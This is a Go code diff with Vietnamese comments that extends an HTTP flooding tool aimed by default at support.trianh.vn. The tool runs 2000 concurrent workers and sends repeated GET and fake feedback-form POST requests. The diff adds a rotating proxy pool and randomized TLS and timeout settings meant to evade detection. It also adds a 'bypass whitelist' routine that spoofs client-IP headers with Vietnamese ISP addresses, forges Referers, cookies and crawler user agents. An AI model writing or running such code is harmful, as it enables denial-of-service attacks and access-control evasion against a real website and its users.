@@ -5,6 +5,7 @@ import (
 	"bytes"
 	"crypto/tls"
 	"fmt"
+	"math"
 	"math/rand"
 	"net/http"
 	"net/url"
@@ -34,27 +35,205 @@ type Proxy struct {
 	Port     string
 	Username string
 	Password string
+	Failures int32      // Số lần kết nối thất bại liên tiếp
+	LastUsed time.Time  // Thời gian sử dụng gần nhất
+	Banned   bool       // Đánh dấu proxy bị cấm tạm thời
+	BanUntil time.Time  // Thời gian hết hạn cấm
+	Country  string     // Quốc gia của proxy
+	mutex    sync.Mutex // Mutex để đồng bộ truy cập
 }
 
 // Cấu trúc để lưu cấu hình
 type Config struct {
-	TargetServer  string
-	TargetPort    string
-	Protocol      string
-	Endpoints     []string
-	MaxConcurrent int
-	DelayMs       int
+	TargetServer       string
+	TargetPort         string
+	Protocol           string
+	Endpoints          []string
+	MaxConcurrent      int
+	DelayMs            int
+	PreferredCountries []string // Danh sách quốc gia ưu tiên cho proxy
+}
+
+// Đánh dấu proxy thất bại
+func (p *Proxy) markFailure() bool {
+	p.mutex.Lock()
+	defer p.mutex.Unlock()
+
+	p.Failures++
+	p.LastUsed = time.Now()
+
+	// Nếu quá nhiều lỗi, cấm tạm thời
+	if p.Failures >= 5 {
+		banDuration := time.Duration(math.Min(float64(p.Failures)*5, 300)) * time.Second
+		p.Banned = true
+		p.BanUntil = time.Now().Add(banDuration)
+		fmt.Printf("⚠️ Proxy %s:%s bị tạm khóa trong %v do quá nhiều lỗi\n", p.IP, p.Port, banDuration)
+		return true // Proxy đã bị cấm
+	}
+
+	return false
+}
+
+// Đánh dấu proxy thành công
+func (p *Proxy) markSuccess() {
+	p.mutex.Lock()
+	defer p.mutex.Unlock()
+
+	p.Failures = 0
+	p.LastUsed = time.Now()
+}
+
+// Kiểm tra proxy có sẵn sàng sử dụng không
+func (p *Proxy) isAvailable() bool {
+	p.mutex.Lock()
+	defer p.mutex.Unlock()
+
+	// Nếu proxy bị cấm, kiểm tra thời gian hết hạn
+	if p.Banned {
+		if time.Now().After(p.BanUntil) {
+			// Hết thời gian cấm
+			p.Banned = false
+			p.Failures = 0
+			fmt.Printf("✅ Proxy %s:%s đã hết thời gian cấm, được phép sử dụng lại\n", p.IP, p.Port)
+			return true
+		}
+		return false
+	}
+
+	return true
+}
+
+// Cấu trúc để quản lý proxy pool
+type ProxyPool struct {
+	proxies []Proxy
+	mutex   sync.Mutex
+}
+
+// Khởi tạo proxy pool
+func NewProxyPool(proxies []Proxy) *ProxyPool {
+	return &ProxyPool{
+		proxies: proxies,
+	}
+}
+
+// Lấy proxy khả dụng
+func (pool *ProxyPool) getAvailableProxy() (Proxy, bool) {
+	pool.mutex.Lock()
+	defer pool.mutex.Unlock()
+
+	// Đếm số proxy khả dụng
+	availableCount := 0
+	for i := range pool.proxies {
+		if pool.proxies[i].isAvailable() {
+			availableCount++
+		}
+	}
+
+	if availableCount == 0 {
+		return Proxy{}, false
+	}
+
+	// Chọn ngẫu nhiên một proxy khả dụng
+	for tries := 0; tries < 3; tries++ { // Thử tối đa 3 lần
+		idx := rand.Intn(len(pool.proxies))
+		if pool.proxies[idx].isAvailable() {
+			return pool.proxies[idx], true
+		}
+	}
+
+	// Nếu chọn ngẫu nhiên không được, quét tuần tự
+	for i := range pool.proxies {
+		if pool.proxies[i].isAvailable() {
+			return pool.proxies[i], true
+		}
+	}
+
+	return Proxy{}, false
+}
+
+// Lấy proxy khả dụng từ một quốc gia cụ thể
+func (pool *ProxyPool) getAvailableProxyFromCountry(country string) (Proxy, bool) {
+	pool.mutex.Lock()
+	defer pool.mutex.Unlock()
+
+	// Đếm số proxy khả dụng từ quốc gia chỉ định
+	var availableProxies []int
+	for i := range pool.proxies {
+		if pool.proxies[i].isAvailable() &&
+			(country == "" || pool.proxies[i].Country == country) {
+			availableProxies = append(availableProxies, i)
+		}
+	}
+
+	if len(availableProxies) == 0 {
+		return Proxy{}, false
+	}
+
+	// Chọn ngẫu nhiên một proxy từ danh sách khả dụng
+	idx := availableProxies[rand.Intn(len(availableProxies))]
+	return pool.proxies[idx], true
+}
+
+// Lấy proxy khả dụng với ưu tiên quốc gia
+func (pool *ProxyPool) getAvailableProxyWithCountryPreference(preferredCountries []string) (Proxy, bool) {
+	// Ưu tiên chọn proxy từ Việt Nam nếu có thể
+	vietnameseProxy, found := pool.getAvailableProxyFromCountry("VN")
+	if found {
+		fmt.Println("✅ Đã tìm thấy proxy từ Việt Nam, ưu tiên sử dụng")
+		return vietnameseProxy, true
+	}
+
+	// Thử từng quốc gia ưu tiên
+	for _, country := range preferredCountries {
+		proxy, found := pool.getAvailableProxyFromCountry(country)
+		if found {
+			return proxy, true
+		}
+	}
+
+	// Nếu không tìm thấy proxy từ các quốc gia ưu tiên, lấy bất kỳ proxy khả dụng nào
+	return pool.getAvailableProxy()
+}
+
+// Báo cáo proxy thất bại
+func (pool *ProxyPool) reportFailure(failedProxy Proxy) {
+	pool.mutex.Lock()
+	defer pool.mutex.Unlock()
+
+	for i := range pool.proxies {
+		if pool.proxies[i].IP == failedProxy.IP && pool.proxies[i].Port == failedProxy.Port {
+			banned := pool.proxies[i].markFailure()
+			if banned {
+				fmt.Printf("⚠️ Proxy %s:%s đã bị đưa vào blacklist tạm thời\n", failedProxy.IP, failedProxy.Port)
+			}
+			return
+		}
+	}
+}
+
+// Báo cáo proxy thành công
+func (pool *ProxyPool) reportSuccess(successProxy Proxy) {
+	pool.mutex.Lock()
+	defer pool.mutex.Unlock()
+
+	for i := range pool.proxies {
+		if pool.proxies[i].IP == successProxy.IP && pool.proxies[i].Port == successProxy.Port {
+			pool.proxies[i].markSuccess()
+			return
+		}
+	}
 }
 
 // Đọc cấu hình từ file config.txt
 func loadConfig(filename string) (*Config, error) {
 	config := &Config{
-		TargetServer:  "support.trianh.vn", // Mặc định
-		TargetPort:    "443",
-		Protocol:      "https",
-		Endpoints:     []string{"/feedback/index", "/task/index"},
-		MaxConcurrent: 2000, // Tăng độ đa luồng lên 2000 mặc định
-		DelayMs:       5,    // Giảm delay mặc định
+		TargetServer:       "support.trianh.vn", // Mặc định
+		TargetPort:         "443",
+		Protocol:           "https",
+		Endpoints:          []string{"/feedback/index", "/task/index"},
+		MaxConcurrent:      2000,                                                                 // Tăng độ đa luồng lên 2000 mặc định
+		DelayMs:            5,                                                                    // Giảm delay mặc định
+		PreferredCountries: []string{"US", "CA", "GB", "SG", "JP", "KR", "DE", "FR", "NL", "AU"}, // Quốc gia ưu tiên mặc định
 	}
 
 	file, err := os.Open(filename)
@@ -96,6 +275,15 @@ func loadConfig(filename string) (*Config, error) {
 			if val, err := strconv.Atoi(value); err == nil {
 				config.DelayMs = val
 			}
+		case "PREFERRED_COUNTRIES":
+			// Format: US,CA,GB,SG,...
+			countries := strings.Split(value, ",")
+			for i, country := range countries {
+				countries[i] = strings.TrimSpace(country)
+			}
+			if len(countries) > 0 {
+				config.PreferredCountries = countries
+			}
 		}
 	}
 
@@ -103,7 +291,7 @@ func loadConfig(filename string) (*Config, error) {
 }
 
 // Đọc danh sách proxy từ file
-func loadProxies(filename string) ([]Proxy, error) {
+func loadProxies(filename string) (*ProxyPool, error) {
 	file, err := os.Open(filename)
 	if err != nil {
 		return nil, err
@@ -119,20 +307,45 @@ func loadProxies(filename string) ([]Proxy, error) {
 			continue
 		}
 
-		// Format: IP:PORT:USERNAME:PASSWORD
+		// Format: IP:PORT:USERNAME:PASSWORD[:COUNTRY]
 		parts := strings.Split(line, ":")
 		if len(parts) >= 4 {
+			country := "UNKNOWN"
+			if len(parts) >= 5 {
+				country = strings.ToUpper(parts[4])
+			} else {
+				// Nếu không có thông tin quốc gia, thử đoán từ IP
+				// Ví dụ: Một số dải IP Việt Nam phổ biến
+				ip := parts[0]
+				if strings.HasPrefix(ip, "14.") ||
+					strings.HasPrefix(ip, "27.") ||
+					strings.HasPrefix(ip, "42.") ||
+					strings.HasPrefix(ip, "58.") ||
+					strings.HasPrefix(ip, "113.") ||
+					strings.HasPrefix(ip, "115.") ||
+					strings.HasPrefix(ip, "117.") ||
+					strings.HasPrefix(ip, "125.") ||
+					strings.HasPrefix(ip, "171.") ||
+					strings.HasPrefix(ip, "183.") ||
+					strings.HasPrefix(ip, "203.") {
+					country = "VN"
+				}
+			}
+
 			proxy := Proxy{
 				IP:       parts[0],
 				Port:     parts[1],
 				Username: parts[2],
 				Password: parts[3],
+				Country:  country,
+				LastUsed: time.Now().Add(-24 * time.Hour), // Đặt thời gian sử dụng gần nhất là 24h trước
 			}
+
 			proxies = append(proxies, proxy)
 		}
 	}
 
-	return proxies, scanner.Err()
+	return NewProxyPool(proxies), scanner.Err()
 }
 
 // Tạo HTTP client với proxy
@@ -201,33 +414,65 @@ func createDirectClient() *http.Client {
 		MinVersion:         tls.VersionTLS12,
 		MaxVersion:         tls.VersionTLS13,
 		CipherSuites:       cipherSuites,
+		// Thêm randomized Client Hello để tránh TLS fingerprinting
+		PreferServerCipherSuites: rand.Intn(2) == 0,
 	}
+
+	// Sử dụng giá trị ngẫu nhiên cho các timeout để tránh bị phát hiện
+	var (
+		idleConnTimeout = time.Duration(rand.Intn(5)+3) * time.Second
+		tlsTimeout      = time.Duration(rand.Intn(10)+25) * time.Second
+		expectTimeout   = time.Duration(rand.Intn(5)+7) * time.Second
+		clientTimeout   = time.Duration(rand.Intn(10)+25) * time.Second
+	)
 
 	transport := &http.Transport{
 		MaxIdleConns:          5000,
 		MaxIdleConnsPerHost:   500,
-		IdleConnTimeout:       5 * time.Second,
-		DisableKeepAlives:     false,
+		IdleConnTimeout:       idleConnTimeout,
+		DisableKeepAlives:     rand.Intn(10) == 0, // 10% cơ hội tắt keep-alive
 		TLSClientConfig:       tlsConfig,
 		DisableCompression:    true,
 		MaxConnsPerHost:       500,
-		ResponseHeaderTimeout: 30 * time.Second, // Tăng timeout cho kết nối trực tiếp
-		ExpectContinueTimeout: 10 * time.Second,
+		ResponseHeaderTimeout: tlsTimeout,
+		ExpectContinueTimeout: expectTimeout,
 		// Thêm vài header proxy giả để tránh bị chặn
 		ProxyConnectHeader: map[string][]string{
 			"User-Agent": {"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
 		},
+		// Sử dụng các tùy chọn để tránh bị phát hiện
+		ForceAttemptHTTP2:   rand.Intn(2) == 0,
+		TLSHandshakeTimeout: tlsTimeout,
 	}
 
 	client := &http.Client{
 		Transport: transport,
-		Timeout:   30 * time.Second, // Tăng timeout cho kết nối trực tiếp
+		Timeout:   clientTimeout,
+		// Thêm CheckRedirect để xử lý redirect một cách ngẫu nhiên (tránh bị phát hiện)
+		CheckRedirect: func(req *http.Request, via []*http.Request) error {
+			// Giới hạn số lần redirect
+			if len(via) >= 10 {
+				return fmt.Errorf("quá nhiều redirect")
+			}
+
+			// Thêm User-Agent mới cho request được redirect
+			if rand.Intn(2) == 0 {
+				userAgents := []string{
+					"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+					"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Safari/605.1.15",
+					"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
+				}
+				req.Header.Set("User-Agent", userAgents[rand.Intn(len(userAgents))])
+			}
+
+			return nil
+		},
 	}
 
 	return client
 }
 
-func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxies []Proxy) {
+func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitGroup, proxyPool *ProxyPool) {
 	defer wg.Done()
 
 	start := time.Now()
@@ -236,23 +481,38 @@ func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitG
 	// Sử dụng proxy trước, nếu có lỗi thì thử kết nối trực tiếp
 	useDirectConnection := false
 
-	// Nếu không có proxy hoặc random chọn kết nối trực tiếp (20% trường hợp)
-	if len(proxies) == 0 || rand.Intn(5) == 0 {
+	// Nếu không có proxy hoặc random chọn kết nối trực tiếp (10% trường hợp thay vì 20%)
+	if proxyPool == nil || len(proxyPool.proxies) == 0 || rand.Intn(10) == 0 {
 		useDirectConnection = true
 	}
 
 	// Thử với proxy trước (nếu có và được chọn)
-	if !useDirectConnection && len(proxies) > 0 {
+	if !useDirectConnection && proxyPool != nil && len(proxyPool.proxies) > 0 {
+		// Danh sách quốc gia ưu tiên - ưu tiên Việt Nam và các nước Đông Nam Á
+		preferredCountries := []string{"VN", "SG", "TH", "MY", "ID", "PH", "JP", "KR", "US", "CA", "GB"}
+
 		// Retry với 3 proxy khác nhau nếu timeout
 		maxProxyRetries := 3
 		for retry := 0; retry < maxProxyRetries; retry++ {
-			// Chọn proxy ngẫu nhiên
-			proxy := proxies[rand.Intn(len(proxies))]
-			fmt.Printf("Client %d đang sử dụng proxy: %s:%s\n", clientID, proxy.IP, proxy.Port)
+			// Lấy proxy khả dụng từ pool với ưu tiên quốc gia
+			proxy, found := proxyPool.getAvailableProxyWithCountryPreference(preferredCountries)
+			if !found {
+				fmt.Printf("Client %d: KHÔNG CÓ PROXY KHẢ DỤNG - THỬ KẾT NỐI TRỰC TIẾP\n", clientID)
+				useDirectConnection = true
+				break
+			}
+
+			// Hiển thị thông tin quốc gia nếu có
+			if proxy.Country != "" && proxy.Country != "UNKNOWN" {
+				fmt.Printf("Client %d đang sử dụng proxy: %s:%s (%s)\n", clientID, proxy.IP, proxy.Port, proxy.Country)
+			} else {
+				fmt.Printf("Client %d đang sử dụng proxy: %s:%s\n", clientID, proxy.IP, proxy.Port)
+			}
 
 			client, err := createProxyClient(proxy)
 			if err != nil {
 				fmt.Printf("Client %d lỗi tạo proxy %s:%s: %v\n", clientID, proxy.IP, proxy.Port, err)
+				proxyPool.reportFailure(proxy)
 				if retry == maxProxyRetries-1 {
 					fmt.Printf("Client %d: TẤT CẢ PROXY ĐỀU THẤT BẠI - THỬ KẾT NỐI TRỰC TIẾP\n", clientID)
 					useDirectConnection = true
@@ -263,7 +523,8 @@ func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitG
 			atomic.AddInt64(&stats.proxyUsedCount, 1)
 
 			// Thực hiện request với proxy
-			if sendRequestWithClient(client, endpoint, clientID, stats, start) {
+			success := sendRequestWithClient(client, endpoint, clientID, stats, start, proxy, proxyPool)
+			if success {
 				return // Thành công, thoát khỏi function
 			}
 
@@ -303,11 +564,14 @@ func sendHTTPRequest(endpoint string, clientID int, stats *Stats, wg *sync.WaitG
 }
 
 // Hàm gửi request với client đã cấu hình
-func sendRequestWithClient(client *http.Client, endpoint string, clientID int, stats *Stats, start time.Time) bool {
+func sendRequestWithClient(client *http.Client, endpoint string, clientID int, stats *Stats, start time.Time, proxy Proxy, proxyPool *ProxyPool) bool {
 	// Mô phỏng yêu cầu GET
 	getResp, err := client.Get(endpoint)
 	if err != nil {
 		fmt.Printf("Lỗi khi gửi GET từ client %d: %v\n", clientID, err)
+		if proxyPool != nil {
+			proxyPool.reportFailure(proxy)
+		}
 		return false
 	}
 	defer getResp.Body.Close()
@@ -316,6 +580,9 @@ func sendRequestWithClient(client *http.Client, endpoint string, clientID int, s
 	// Kiểm tra status code
 	if getResp.StatusCode < 200 || getResp.StatusCode >= 300 {
 		fmt.Printf("Client %d (GET) nhận status code không thành công: %d\n", clientID, getResp.StatusCode)
+		if proxyPool != nil && getResp.StatusCode >= 400 {
+			proxyPool.reportFailure(proxy)
+		}
 	}
 
 	// Mô phỏng yêu cầu POST (giả lập gửi form feedback)
@@ -345,6 +612,9 @@ func sendRequestWithClient(client *http.Client, endpoint string, clientID int, s
 	postResp, err := client.Do(postReq)
 	if err != nil {
 		fmt.Printf("Lỗi khi gửi POST từ client %d: %v\n", clientID, err)
+		if proxyPool != nil {
+			proxyPool.reportFailure(proxy)
+		}
 		return false
 	}
 	defer postResp.Body.Close()
@@ -353,6 +623,12 @@ func sendRequestWithClient(client *http.Client, endpoint string, clientID int, s
 	// Kiểm tra status code
 	if postResp.StatusCode < 200 || postResp.StatusCode >= 300 {
 		fmt.Printf("Client %d (POST) nhận status code không thành công: %d\n", clientID, postResp.StatusCode)
+		if proxyPool != nil && postResp.StatusCode >= 400 {
+			proxyPool.reportFailure(proxy)
+		}
+	} else if proxyPool != nil {
+		// Báo cáo proxy thành công
+		proxyPool.reportSuccess(proxy)
 	}
 
 	// Cập nhật thống kê - thành công
@@ -371,55 +647,85 @@ func sendRequestWithClient(client *http.Client, endpoint string, clientID int, s
 func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, clientID int, stats *Stats, start time.Time, attempt int) bool {
 	// Danh sách User-Agent đa dạng (bao gồm cả crawler và bot hợp pháp)
 	userAgents := []string{
-		// Browser phổ biến
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Safari/605.1.15",
-		"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36",
+		// Browser phổ biến ở Việt Nam
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/117.0",
+		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Coc_Coc/112.0.5615.165 Chrome/106.0.5249.165 Safari/537.36", // Cốc Cốc browser phổ biến ở VN
+		"Mozilla/5.0 (Linux; Android 10; SM-A505F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.210 Mobile Safari/537.36",                 // Samsung phổ biến tại VN
+		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",                               // iOS tại VN
 		// Crawler hợp pháp
 		"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
-		"Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
-		"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
-		// Mobile
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (Android 11; Mobile; rv:89.0) Gecko/89.0 Firefox/89.0",
-		// Thêm các User-Agent mới
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
-		"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
-		"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/116.0",
-		"Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
-		"Mozilla/5.0 (iPad; CPU OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.5 Mobile/15E148 Safari/604.1",
+		"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
 	}
 
-	// Headers để thử bypass
+	// Headers để thử bypass - ưu tiên IP Việt Nam
 	xForwardedFor := []string{
+		// Vietnam IPs (ưu tiên)
+		"14.161.0.1",   // VNPT
+		"27.72.98.1",   // VNPT
+		"42.112.34.1",  // Viettel
+		"58.186.12.1",  // FPT
+		"113.161.80.1", // VNPT
+		"115.79.34.1",  // VNPT
+		"117.0.37.1",   // Viettel
+		"125.234.12.1", // FPT
+		"171.224.50.1", // Viettel
+		"183.80.132.1", // VNPT
+		"203.162.0.1",  // Vietnam IP
+		"113.161.0.1",  // Vietnam IP
+		"116.118.0.1",  // Vietnam IP
+		"14.161.0.1",   // Vietnam IP
+		"171.225.0.1",  // Vietnam IP
+		"115.79.0.1",   // Vietnam IP
+		"123.24.0.1",   // Vietnam IP
+		"42.112.0.1",   // Vietnam IP
+		"125.234.0.1",  // Vietnam IP
+		// Fallback IPs
 		"127.0.0.1",
 		"192.168.1.1",
 		"10.0.0.1",
 		"172.16.0.1",
-		"203.162.0.1", // Vietnam IP
-		"113.161.0.1", // Vietnam IP
-		"116.118.0.1", // Vietnam IP
-		"14.161.0.1",  // Vietnam IP
-		"171.225.0.1", // Vietnam IP
-		"115.79.0.1",  // Vietnam IP
-		"123.24.0.1",  // Vietnam IP
-		"42.112.0.1",  // Vietnam IP
-		"125.234.0.1", // Vietnam IP
 	}
 
-	// Danh sách các host ISP để tạo giả Referer
+	// Danh sách các host ISP để tạo giả Referer - ưu tiên website Việt Nam
 	refererHosts := []string{
+		// Sites phổ biến tại Việt Nam
 		"vnexpress.net",
 		"dantri.com.vn",
-		"facebook.com",
-		"google.com",
-		"youtube.com",
-		"tiktok.com",
-		"vietcombank.com.vn",
-		"vietnamnet.vn",
 		"24h.com.vn",
 		"tuoitre.vn",
+		"vietnamnet.vn",
+		"thanhnien.vn",
+		"kenh14.vn",
+		"cafef.vn",
+		"genk.vn",
+		"zing.vn",
+		"baomoi.com",
+		"voh.com.vn",
+		"vietcombank.com.vn",
+		"vietinbank.vn",
+		"mbbank.com.vn",
+		"facebook.com",
+		"google.com.vn",
+		"youtube.com",
+		"tiktok.com",
+	}
+
+	// Danh sách các ngôn ngữ để mô phỏng người dùng Việt Nam
+	acceptLanguages := []string{
+		// Ưu tiên tiếng Việt
+		"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
+		"vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
+		"vi;q=0.9,en-US;q=0.8,en;q=0.7",
+		"vi;q=1.0,en;q=0.5",
+		"vi-VN;q=0.9,vi;q=0.8,en-US;q=0.7,en;q=0.6",
+		// Ngôn ngữ khác
+		"en-US,en;q=0.9,vi;q=0.8",
+		"en-GB,en;q=0.9,vi;q=0.8",
+		"fr-FR,fr;q=0.9,vi;q=0.8,en-US;q=0.7,en;q=0.6",
 	}
 
 	// Tạo request GET với headers đặc biệt để bypass
@@ -429,12 +735,26 @@ func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, 
 		return false
 	}
 
-	// Chọn user agent ngẫu nhiên
-	selectedUA := userAgents[rand.Intn(len(userAgents))]
+	// 80% chọn User-Agent của thiết bị phổ biến tại Việt Nam
+	selectedUA := ""
+	if rand.Intn(10) < 8 {
+		// Chọn 8/10 UA phổ biến ở VN
+		selectedUA = userAgents[rand.Intn(8)]
+	} else {
+		// Chọn bất kỳ UA nào
+		selectedUA = userAgents[rand.Intn(len(userAgents))]
+	}
 	getReq.Header.Set("User-Agent", selectedUA)
 
-	// Chọn IP ngẫu nhiên
-	randomIP := xForwardedFor[rand.Intn(len(xForwardedFor))]
+	// 90% chọn IP của Việt Nam để giả mạo
+	randomIP := ""
+	if rand.Intn(10) < 9 {
+		// Chọn IP Việt Nam
+		randomIP = xForwardedFor[rand.Intn(20)] // 20 IP đầu tiên là IP Việt Nam
+	} else {
+		// Chọn bất kỳ IP nào
+		randomIP = xForwardedFor[rand.Intn(len(xForwardedFor))]
+	}
 
 	// Thêm các header để bypass whitelist
 	if rand.Intn(2) == 0 {
@@ -453,6 +773,15 @@ func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, 
 		getReq.Header.Set("True-Client-IP", randomIP)
 	}
 
+	// 80% chọn ngôn ngữ tiếng Việt
+	if rand.Intn(10) < 8 {
+		// Chọn tiếng Việt (5 lựa chọn đầu tiên)
+		getReq.Header.Set("Accept-Language", acceptLanguages[rand.Intn(5)])
+	} else {
+		// Chọn bất kỳ ngôn ngữ nào
+		getReq.Header.Set("Accept-Language", acceptLanguages[rand.Intn(len(acceptLanguages))])
+	}
+
 	// CF-Connecting-IP và một số header đặc biệt khác
 	if rand.Intn(3) == 0 {
 		getReq.Header.Set("CF-Connecting-IP", randomIP)
@@ -462,13 +791,34 @@ func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, 
 		getReq.Header.Set("Fastly-Client-IP", randomIP)
 	}
 
+	// Thêm các header CDN và Cloud Provider
+	if rand.Intn(3) == 0 {
+		getReq.Header.Set("X-Azure-ClientIP", randomIP)
+	}
+
+	if rand.Intn(3) == 0 {
+		getReq.Header.Set("X-Forwarded-By", "FPT-Cloud")
+	}
+
+	if rand.Intn(3) == 0 {
+		getReq.Header.Set("X-Forwarded-By", "VNPT-NET")
+	}
+
 	// Thêm header Referer để giả vờ đến từ một trang hợp pháp
 	if rand.Intn(2) == 0 {
 		// 50% cơ hội sử dụng Referer từ trang đích
 		getReq.Header.Set("Referer", fmt.Sprintf("https://%s/", strings.Split(getReq.URL.Host, ":")[0]))
 	} else {
 		// 50% cơ hội sử dụng Referer từ một trang web phổ biến
-		refHost := refererHosts[rand.Intn(len(refererHosts))]
+		// 80% chọn website Việt Nam
+		var refHost string
+		if rand.Intn(10) < 8 {
+			// Chọn website Việt Nam (15 lựa chọn đầu tiên)
+			refHost = refererHosts[rand.Intn(15)]
+		} else {
+			// Chọn bất kỳ website nào
+			refHost = refererHosts[rand.Intn(len(refererHosts))]
+		}
 		getReq.Header.Set("Referer", fmt.Sprintf("https://%s/", refHost))
 	}
 
@@ -489,6 +839,12 @@ func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, 
 		cookieParts = append(cookieParts, fmt.Sprintf("cf_clearance=%x%x", rand.Int63(), rand.Int63()))
 	}
 
+	// Thêm cookie ngôn ngữ tiếng Việt
+	cookieParts = append(cookieParts, "lang=vi")
+
+	// Thêm cookie vùng Việt Nam
+	cookieParts = append(cookieParts, "country=VN")
+
 	// Kết hợp cookies ngẫu nhiên
 	getReq.Header.Set("Cookie", strings.Join(cookieParts, "; "))
 
@@ -499,15 +855,6 @@ func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, 
 		"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
 	}
 	getReq.Header.Set("Accept", acceptHeaders[rand.Intn(len(acceptHeaders))])
-
-	// Accept-Language ngẫu nhiên
-	langHeaders := []string{
-		"en-US,en;q=0.9,vi;q=0.8",
-		"vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
-		"en-US,en;q=0.5",
-		"vi;q=0.8,en-US;q=0.5,en;q=0.3",
-	}
-	getReq.Header.Set("Accept-Language", langHeaders[rand.Intn(len(langHeaders))])
 
 	// Cache-Control và Pragma ngẫu nhiên
 	if rand.Intn(2) == 0 {
@@ -524,6 +871,36 @@ func sendRequestWithClientBypassWhitelist(client *http.Client, endpoint string, 
 		getReq.Header.Set("Sec-Ch-Ua", "\"Chromium\";v=\"122\", \"Not(A:Brand\";v=\"24\", \"Google Chrome\";v=\"122\"")
 		getReq.Header.Set("Sec-Ch-Ua-Mobile", "?0")
 		getReq.Header.Set("Sec-Ch-Ua-Platform", "\"Windows\"")
+	}
+
+	// 80% giả mạo trình duyệt từ Việt Nam
+	if rand.Intn(10) < 8 {
+		getReq.Header.Set("Accept-Language", "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7")
+		getReq.Header.Set("X-Country-Code", "VN")
+	} else {
+		// 20% giả mạo trình duyệt từ nước khác
+		switch rand.Intn(5) {
+		case 0:
+			// Giả mạo trình duyệt từ Singapore
+			getReq.Header.Set("Accept-Language", "en-SG,en;q=0.9,zh-SG;q=0.8")
+			getReq.Header.Set("X-Country-Code", "SG")
+		case 1:
+			// Giả mạo trình duyệt từ Thái Lan
+			getReq.Header.Set("Accept-Language", "th-TH,th;q=0.9,en;q=0.8")
+			getReq.Header.Set("X-Country-Code", "TH")
+		case 2:
+			// Giả mạo trình duyệt từ Malaysia
+			getReq.Header.Set("Accept-Language", "en-MY,en;q=0.9,ms;q=0.8")
+			getReq.Header.Set("X-Country-Code", "MY")
+		case 3:
+			// Giả mạo trình duyệt từ Nhật Bản
+			getReq.Header.Set("Accept-Language", "ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7")
+			getReq.Header.Set("X-Country-Code", "JP")
+		case 4:
+			// Giả mạo trình duyệt từ Hàn Quốc
+			getReq.Header.Set("Accept-Language", "ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7")
+			getReq.Header.Set("X-Country-Code", "KR")
+		}
 	}
 
 	// Thực hiện request
@@ -625,21 +1002,22 @@ func main() {
 	stats := &Stats{}
 
 	// Đọc danh sách proxy
-	proxies, err := loadProxies("proxies.txt")
+	proxyPool, err := loadProxies("proxies.txt")
 	if err != nil {
